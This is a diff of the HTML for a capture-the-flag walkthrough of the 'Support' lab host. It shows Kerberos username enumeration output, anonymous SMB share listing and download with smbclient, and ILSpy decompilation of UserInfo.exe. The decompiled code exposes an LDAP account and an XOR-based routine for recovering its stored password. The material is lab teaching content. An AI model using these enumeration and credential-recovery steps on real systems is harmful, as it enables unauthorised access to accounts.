+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>Version: dev (9cfb81e) - 11/09/22 - Ronnie Flathers @ropnop
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>2022/11/09 05:16:54 &gt;  Using KDC(s):
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>2022/11/09 05:16:54 &gt;   10.10.11.174:88
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>2022/11/09 05:16:56 &gt;  [+] VALID USERNAME:  support@support
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a>2022/11/09 05:16:57 &gt;  [+] VALID USERNAME:  guest@support
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>2022/11/09 05:17:03 &gt;  [+] VALID USERNAME:  administrator@support
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a>2022/11/09 05:17:52 &gt;  [+] VALID USERNAME:  Guest@support
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>2022/11/09 05:17:53 &gt;  [+] VALID USERNAME:  Administrator@support
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a>2022/11/09 05:19:42 &gt;  [+] VALID USERNAME:  management@support
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a>2022/11/09 05:19:59 &gt;  [+] VALID USERNAME:  Support@support
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a>2022/11/09 05:20:52 &gt;  [+] VALID USERNAME:  GUEST@support
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a>2022/11/09 05:31:02 &gt;  [+] VALID USERNAME:  SUPPORT@support
+</span></code></pre></div></td></tr></table></div>
 <p>The same thing we did with kerbrute, we could have done it with dnsrecon.</p>
 <p>Samba service is open so we can try to enumerate the shares provided by the host:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># -L looks at what services are available on a target and -N forces the tool not to ask for a password</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$ip</span><span class="w"> </span>-N
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="c1"># -L looks at what services are available on a target and -N forces the tool not to ask for a password</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$ip</span><span class="w"> </span>-N
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>        Sharename       Type      Comment
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>        ---------       ----      -------
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>        ADMIN$          Disk      Remote Admin
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>        C$              Disk      Default share
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>        IPC$            IPC       Remote IPC
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>        NETLOGON        Disk      Logon server share
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>        support-tools   Disk      support staff tools
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>        SYSVOL          Disk      Logon server share
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>Reconnecting with SMB1 for workgroup listing.
-</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>Unable to connect with SMB1 -- no workgroup available
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-10-10">10</a></span>
+<span class="normal"><a href="#__codelineno-10-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>        Sharename       Type      Comment
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>        ---------       ----      -------
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>        ADMIN$          Disk      Remote Admin
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a>        C$              Disk      Default share
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>        IPC$            IPC       Remote IPC
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>        NETLOGON        Disk      Logon server share
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a>        support-tools   Disk      support staff tools
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a>        SYSVOL          Disk      Logon server share
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a>Reconnecting with SMB1 for workgroup listing.
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10"></a>do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11"></a>Unable to connect with SMB1 -- no workgroup available
+</span></code></pre></div></td></tr></table></div>
 <h3 id="initial-access">Initial access</h3>
 <p>After trying to connect to ADMIN$, C$, we connect to the share "support-tools":</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>smbclient<span class="w"> </span>/<span class="se">\\</span><span class="m">10</span>.10.11.174/<span class="se">\s</span>upport-tools
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>smbclient<span class="w"> </span>/<span class="se">\\</span><span class="m">10</span>.10.11.174/<span class="se">\s</span>upport-tools
+</span></code></pre></div></td></tr></table></div>
 <p>This way, we obtain a prompt command line in samba (smb: &gt;). Typing help in that command line you can see which commands you can execute.</p>
 <p>Also, we list the content in the folder:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>dir
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>dir
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>smb: \&gt; dir
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  .                                   D        0  Wed Jul 20 13:01:06 2022
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>  ..                                  D        0  Sat May 28 07:18:25 2022
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
-</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>
-</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>                4026367 blocks of size 4096. 968945 blocks available
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-13-10">10</a></span>
+<span class="normal"><a href="#__codelineno-13-11">11</a></span>
+<span class="normal"><a href="#__codelineno-13-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>smb: \&gt; dir
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>  .                                   D        0  Wed Jul 20 13:01:06 2022
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>  ..                                  D        0  Sat May 28 07:18:25 2022
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a>  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a>  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6"></a>  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7"></a>  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8"></a>  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9"></a>  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10"></a>  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11"></a>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12"></a>                4026367 blocks of size 4096. 968945 blocks available
+</span></code></pre></div></td></tr></table></div>
 <p>Also, we check permissions on the share and we learn that we only have read permissions. Now we are going to retrieve all these files to pay close attention. Among the commands you can execute you have mget. So we run:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>mget *
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>mget *
+</span></code></pre></div></td></tr></table></div>
 <p>This will download all the files to the local folder from where you initiated your samba connection. Close the connection:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>quit
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>quit
+</span></code></pre></div></td></tr></table></div>
 <p>Now, have a close look at the files we have downloaded. Unzip UserInfo.exe.zip file:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>unzip<span class="w"> </span>UserInfo.exe.zip
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>unzip<span class="w"> </span>UserInfo.exe.zip
+</span></code></pre></div></td></tr></table></div>
 <p>After unzipping UserInfo.exe.zip, you have two files: UserInfo.exe and UserInfo.exe.config. Run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>cat<span class="w"> </span>UserInfo.exe.config
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>cat<span class="w"> </span>UserInfo.exe.config
+</span></code></pre></div></td></tr></table></div>
 <p>Result:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>&lt;configuration&gt;
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>    &lt;startup&gt;
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.8&quot; /&gt;
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>    &lt;/startup&gt;
-</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>  &lt;runtime&gt;
-</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>    &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;
-</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>      &lt;dependentAssembly&gt;
-</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>        &lt;assemblyIdentity name=&quot;System.Runtime.CompilerServices.Unsafe&quot; publicKeyToken=&quot;b03f5f7f11d50a3a&quot; culture=&quot;neutral&quot; /&gt;
-</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>        &lt;bindingRedirect oldVersion=&quot;0.0.0.0-6.0.0.0&quot; newVersion=&quot;6.0.0.0&quot; /&gt;
-</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>      &lt;/dependentAssembly&gt;
-</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>    &lt;/assemblyBinding&gt;
-</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>  &lt;/runtime&gt;
-</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>&lt;/configuration&gt;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-18-10">10</a></span>
+<span class="normal"><a href="#__codelineno-18-11">11</a></span>
+<span class="normal"><a href="#__codelineno-18-12">12</a></span>
+<span class="normal"><a href="#__codelineno-18-13">13</a></span>
+<span class="normal"><a href="#__codelineno-18-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>&lt;configuration&gt;
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>    &lt;startup&gt;
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a>        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.8&quot; /&gt;
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>    &lt;/startup&gt;
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a>  &lt;runtime&gt;
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a>    &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a>      &lt;dependentAssembly&gt;
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a>        &lt;assemblyIdentity name=&quot;System.Runtime.CompilerServices.Unsafe&quot; publicKeyToken=&quot;b03f5f7f11d50a3a&quot; culture=&quot;neutral&quot; /&gt;
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10"></a>        &lt;bindingRedirect oldVersion=&quot;0.0.0.0-6.0.0.0&quot; newVersion=&quot;6.0.0.0&quot; /&gt;
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11"></a>      &lt;/dependentAssembly&gt;
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12"></a>    &lt;/assemblyBinding&gt;
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13"></a>  &lt;/runtime&gt;
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14"></a>&lt;/configuration&gt;
+</span></code></pre></div></td></tr></table></div>
 <p>From this, we can know that UserInfo.exe is a binary assembled with the .NETFramework. Basically, this executable appears to be used to pull user information, likely from Active Directory. Now, if we want to go further in our inspection we will need a .NET decompiler for Linux. Here we have several options.</p>
 <p>Since it's open source and we are using a kali virtual machine to perform this penetration test, let's use <a href="https://github.com/icsharpcode/ILSpy/">ILSpy</a>, but you can have a look at alternative tools at the end of this walkthrough. To run ILSpy, you need to install it before. Also, it has some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">cd</span><span class="w"> </span>~/tools/AvaloniaILSpy/artifacts/linux-x64
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>./ILSpy
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="nb">cd</span><span class="w"> </span>~/tools/AvaloniaILSpy/artifacts/linux-x64
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>./ILSpy
+</span></code></pre></div></td></tr></table></div>
 <p>Open UserInfo.exe in the program and inspect the code. There are several parts in the code:</p>
 <ul>
 <li>References</li>
@@ -17399,66 +17529,112 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <p>In the UserInfo.Services you can find the LdadQuery():</p>
 <p><img alt="ILSpy" src="../img/ilspy.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>using System.DirectoryServices;
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>public LdapQuery()
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>{
-</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>    //IL_0018: Unknown result type (might be due to invalid IL or missing references)
-</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>    //IL_0022: Expected O, but got Unknown
-</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>    //IL_0035: Unknown result type (might be due to invalid IL or missing references)
-</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>    //IL_003f: Expected O, but got Unknown
-</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>    string password = Protected.getPassword();
-</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>    entry = new DirectoryEntry(&quot;LDAP://support.htb&quot;, &quot;support\\ldap&quot;, password);
-</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>    entry.set_AuthenticationType((AuthenticationTypes)1);
-</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>    ds = new DirectorySearcher(entry);
-</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-20-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-20-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-20-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-20-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-20-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-20-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-20-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-20-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-20-10">10</a></span>
+<span class="normal"><a href="#__codelineno-20-11">11</a></span>
+<span class="normal"><a href="#__codelineno-20-12">12</a></span>
+<span class="normal"><a href="#__codelineno-20-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>using System.DirectoryServices;
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3"></a>public LdapQuery()
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4"></a>{
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5"></a>    //IL_0018: Unknown result type (might be due to invalid IL or missing references)
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6"></a>    //IL_0022: Expected O, but got Unknown
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7"></a>    //IL_0035: Unknown result type (might be due to invalid IL or missing references)
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8"></a>    //IL_003f: Expected O, but got Unknown
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9"></a>    string password = Protected.getPassword();
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10"></a>    entry = new DirectoryEntry(&quot;LDAP://support.htb&quot;, &quot;support\\ldap&quot;, password);
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11"></a>    entry.set_AuthenticationType((AuthenticationTypes)1);
+</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12"></a>    ds = new DirectorySearcher(entry);
+</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13"></a>}
+</span></code></pre></div></td></tr></table></div>
 <p>From where we stand, we can understand that LdapQuery() function is used to login into the Active Directory with the user "support". As a password, it calls the getPassword() function. Let's click on that function in the code to see it:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>public static string getPassword()
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>{
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>    byte[] array = Convert.FromBase64String(enc_password);
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>    byte[] array2 = array;
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>    for (int i = 0; i &lt; array.Length; i++)
-</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>    {
-</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
-</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>    }
-</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>    return Encoding.Default.GetString(array2);
-</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>}
-</span></code></pre></div>
